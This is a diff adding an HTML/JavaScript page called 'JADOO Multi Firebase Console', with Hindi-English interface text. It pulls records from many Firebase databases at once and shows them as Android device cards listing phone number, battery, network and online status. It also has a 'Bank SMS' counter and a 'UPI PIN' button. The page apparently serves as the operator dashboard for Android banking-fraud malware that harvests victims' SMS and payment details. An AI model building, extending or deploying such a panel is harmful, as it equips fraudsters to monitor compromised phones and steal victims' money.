@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JADOO - Multi Firebase Console</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/9.22.1/firebase-app-compat.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/9.22.1/firebase-database-compat.min.js"></script>
+</head>
+<body class="bg-black text-gray-100 min-h-screen font-sans">
+
+    <!-- SETUP SCREEN (Multi-Firebase Input) -->
+    <div id="setup-screen" class="max-w-xl mx-auto mt-12 p-6 bg-gray-900 border border-gray-800 rounded-2xl shadow-2xl">
+        <div class="flex items-center space-x-3 mb-4">
+            <div class="w-10 h-10 rounded-full bg-red-600/20 flex items-center justify-center text-red-500 font-bold text-lg">⚡</div>
+            <h1 class="text-xl font-bold text-white tracking-wide">JADOO MULTI-PANEL SETUP</h1>
+        </div>
+        <p class="text-xs text-gray-400 mb-4">Upto 500 Firebase URLs line-by-line paste karein taaki saare databases merge hokar ek sath live stats dikha sakein:</p>
+        <textarea id="multi-urls-input" rows="6" class="w-full bg-black border border-gray-800 rounded-xl p-3 text-xs text-gray-200 focus:outline-none focus:border-red-600 mb-4 font-mono" placeholder="https://db1-default-rtdb.firebaseio.com/&#10;https://db2-default-rtdb.firebaseio.com/"></textarea>
+        <button onclick="launchMultiDashboard()" class="w-full bg-red-700 hover:bg-red-600 text-white font-semibold py-3 rounded-xl transition-all shadow-lg text-sm">🚀 Open Multi-Dashboard</button>
+    </div>
+
+    <!-- MAIN DASHBOARD (Hidden initially) -->
+    <div id="dashboard-screen" class="hidden max-w-lg mx-auto p-4 pb-20">
+        <!-- Top Bar -->
+        <div class="flex justify-between items-center mb-6 pt-2">
+            <div class="flex items-center space-x-3">
+                <div class="w-9 h-9 rounded-full bg-gray-800 flex items-center justify-center font-bold text-white border border-gray-700">💀</div>
+                <div>
+                    <h2 class="text-lg font-bold tracking-wider text-white">JADOO</h2>
+                    <p class="text-[10px] text-gray-400" id="connected-db-info">Connected: 0 DBs</p>
+                </div>
+            </div>
+            <button onclick="location.reload()" class="bg-gray-900 border border-gray-800 text-gray-300 text-xs px-3 py-1.5 rounded-lg">🔄 Reset</button>
+        </div>
+
+        <!-- Stats Bar -->
+        <div class="grid grid-cols-4 gap-2 mb-6 bg-gray-900/50 border border-gray-800/80 p-3 rounded-2xl text-center">
+            <div>
+                <p class="text-[10px] text-gray-400 font-semibold uppercase">Total</p>
+                <p class="text-lg font-bold text-white" id="stat-total">0</p>
+            </div>
+            <div>
+                <p class="text-[10px] text-gray-400 font-semibold uppercase">Online</p>
+                <p class="text-lg font-bold text-green-400" id="stat-online">0</p>
+            </div>
+            <div>
+                <p class="text-[10px] text-gray-400 font-semibold uppercase">Offline</p>
+                <p class="text-lg font-bold text-gray-400" id="stat-offline">0</p>
+            </div>
+            <div>
+                <p class="text-[10px] text-gray-400 font-semibold uppercase">Bank SMS</p>
+                <p class="text-lg font-bold text-white">0</p>
+            </div>
+        </div>
+
+        <!-- Filter Tabs -->
+        <div class="flex space-x-2 mb-4 overflow-x-auto pb-1 text-xs">
+            <button onclick="filterStatus('all')" class="px-4 py-1.5 rounded-full bg-red-900/80 text-white font-medium filter-btn active" data-filter="all">All</button>
+            <button onclick="filterStatus('online')" class="px-4 py-1.5 rounded-full bg-gray-900 text-gray-400 border border-gray-800 font-medium filter-btn" data-filter="online">Online</button>
+            <button onclick="filterStatus('offline')" class="px-4 py-1.5 rounded-full bg-gray-900 text-gray-400 border border-gray-800 font-medium filter-btn" data-filter="offline">Offline</button>
+        </div>
+
+        <!-- Devices Cards Container -->
+        <div id="devices-container" class="space-y-4">
+            <!-- Merged device cards will appear here dynamically -->
+        </div>
+    </div>
+
+    <script>
+        let allDevicesMap = {};
+        let currentFilter = 'all';
+
+        function launchMultiDashboard() {
+            const rawText = document.getElementById('multi-urls-input').value.trim();
+            if (!rawText) {
+                alert('Kripya kam se kam ek valid Firebase URL dalein!');
+                return;
+            }
+
+            const urls = rawText.split('\n').map(u => u.trim()).filter(u => u.startsWith('http'));
+            if (urls.length === 0) {
+                alert('Koi valid URL nahi mila!');
+                return;
+            }
+
+            document.getElementById('setup-screen').classList.add('hidden');
+            document.getElementById('dashboard-screen').classList.remove('hidden');
+            document.getElementById('connected-db-info').innerText = `Connected: ${urls.length} DBs`;
+
+            urls.forEach((dbUrl, index) => {
+                connectInstance(dbUrl, index);
+            });
+        }
+
+        function connectInstance(dbUrl, index) {
+            try {
+                const config = { databaseURL: dbUrl };
+                const appName = `multi_db_${index}`;
+                let app;
+                try {
+                    app = firebase.initializeApp(config, appName);
+                } catch (e) {
+                    app = firebase.app(appName);
+                }
+                const db = firebase.database(app);
+
+                db.ref('/').on('value', (snapshot) => {
+                    const data = snapshot.val();
+                    parseData(dbUrl, data);
+                });
+            } catch (err) {
+                console.error("Connection error:", err);
+            }
+        }
+
+        function parseData(dbUrl, data) {
+            if (!data) return;
+            let items = data.clients || data.devices || data;
+
+            for (let key in items) {
+                if (typeof items[key] === 'object' && items[key] !== null) {
+                    let uniqueKey = `${btoa(dbUrl).substring(0, 6)}_${key}`;
+                    allDevicesMap[uniqueKey] = {
+                        dbUrl: dbUrl,
+                        id: key,
+                        ...items[key]
+                    };
+                }
+            }
+            renderDashboard();
+        }
+
+        function filterStatus(status) {
+            currentFilter = status;
+            document.querySelectorAll('.filter-btn').forEach(btn => {
+                if(btn.dataset.filter === status) {
+                    btn.className = "px-4 py-1.5 rounded-full bg-red-900/80 text-white font-medium filter-btn active";
+                } else {
+                    btn.className = "px-4 py-1.5 rounded-full bg-gray-900 text-gray-400 border border-gray-800 font-medium filter-btn";
+                }
+            });
+            renderDashboard();
+        }
+
+        function renderDashboard() {
+            const container = document.getElementById('devices-container');
+            container.innerHTML = '';
+
+            let total = 0, onlineCount = 0, offlineCount = 0;
+            let keys = Object.keys(allDevicesMap);
+            total = keys.length;
+
+            keys.forEach(k => {
+                let dev = allDevicesMap[k];
+                let statusVal = String(dev.status || dev.connection || dev.state || '').toLowerCase();
+                let isOnline = (['online', 'connected', 'true', '1', 'active'].includes(statusVal) || dev.active === true || dev.online === true);
+
+                if (isOnline) onlineCount++;
+                else offlineCount++;
+
+                if (currentFilter === 'online' && !isOnline) return;
+                if (currentFilter === 'offline' && isOnline) return;
+
+                let cardHTML = `
+                    <div class="bg-gray-900/90 border border-gray-800/80 p-4 rounded-2xl shadow-lg relative">
+                        <div class="flex justify-between items-start mb-2">
+                            <div>
+                                <h3 class="font-bold text-white text-sm">${dev.model || dev.deviceName || 'Android Device'}</h3>
+                                <p class="text-[10px] text-gray-500 font-mono">${dev.id}</p>
+                            </div>
+                            <div class="flex space-x-1 text-gray-400">
+                                <span class="text-xs">⭐</span>
+                                <span class="text-xs">⚡</span>
+                            </div>
+                        </div>
+
+                        <div class="grid grid-cols-2 gap-2 text-xs my-3 bg-black/40 p-2.5 rounded-xl border border-gray-800/50">
+                            <div>
+                                <p class="text-[9px] text-gray-500 uppercase">Android</p>
+                                <p class="font-semibold text-gray-300">${dev.android || dev.version || 'v13'}</p>
+                            </div>
+                            <div>
+                                <p class="text-[9px] text-gray-500 uppercase">Battery</p>
+                                <p class="font-semibold text-gray-300">${dev.battery || '—'}%</p>
+                            </div>
+                            <div>
+                                <p class="text-[9px] text-gray-500 uppercase">Number</p>
+                                <p class="font-semibold text-gray-300">${dev.number || dev.phone || '—'}</p>
+                            </div>
+                            <div>
+                                <p class="text-[9px] text-gray-500 uppercase">Network</p>
+                                <p class="font-semibold text-gray-300">${dev.network || 'JIO 4G'}</p>
+                            </div>
+                        </div>
+
+                        <div class="flex justify-between items-center mt-2">
+                            <span class="text-[11px] font-medium ${isOnline ? 'text-green-400' : 'text-gray-400'} flex items-center gap-1.5">
+                                <span class="w-2 h-2 rounded-full ${isOnline ? 'bg-green-500 animate-pulse' : 'bg-gray-500'}"></span>
+                                ${isOnline ? 'Online' : 'Offline'}
+                            </span>
+                            <button class="bg-gray-800 hover:bg-gray-700 text-amber-400 text-[10px] font-bold px-3 py-1.5 rounded-lg border border-amber-500/20">UPI PIN</button>
+                        </div>
+                    </div>
+                `;
+                container.innerHTML += cardHTML;
+            });
+
+            document.getElementById('stat-total').innerText = total;
+            document.getElementById('stat-online').innerText = onlineCount;
+            document.getElementById('stat-offline').innerText = offlineCount;
+        }
+    </script>
+</body>
+</html>
